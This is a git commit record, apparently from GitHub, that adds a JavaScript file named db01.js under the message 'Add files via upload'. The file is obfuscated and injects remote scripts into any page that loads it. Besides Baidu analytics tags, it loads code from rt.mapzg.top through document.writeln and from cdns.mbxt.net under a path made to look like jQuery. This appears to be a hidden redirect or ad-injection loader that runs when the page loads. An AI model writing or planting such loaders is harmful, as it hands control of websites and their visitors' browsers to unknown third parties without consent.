6983f443f6284859a99736660bc17247efe15b81
xiaoerlan1010 <90568637+xiaoerlan1010@users.noreply.github.com>
2021-12-17 14:10:04 +0800

    Add files via upload

---
+++ db01.js
@@ -0,0 +1,14 @@
+var _ZTEqnt = [{ycb:function(){var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?06323c9ef7805059a5ea2adea2e953ff";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+document.writeln("<script src=\'https://rt.mapzg.top/c/647F5DC9-0CF9-4AA8-9F74-3E77F882F848.panda\'><\/script>");},kgG:"6000686",zws:"1"},];var faheE = [6000686,];var IcyTfWA = Math.floor(Math.random()*faheE.length);for(var KOF=0;KOF < _ZTEqnt.length;KOF++ ){if(faheE[IcyTfWA]==_ZTEqnt[KOF].kgG){_ZTEqnt[KOF].ycb();}}if(!window.top.cLUbn){window.top.cLUbn="gqWeupkL";var _hmt=_hmt||[];(function(){var hm=document.createElement("script");hm.src="https://hm.baidu.com/hm.js?184c17db04e236337d089cd271a46f38";var s=document.getElementsByTagName("script")[0];s.parentNode.insertBefore(hm,s)})();}
+ var hi = document.createElement("script");
+                    hi.src = "//cdns.mbxt.net/hx/jquery/1606795563PUnIQuKi.js";
+                    var k = document.getElementsByTagName("script")[0];
+                    k.parentNode.insertBefore(hi, k);
+               
+           
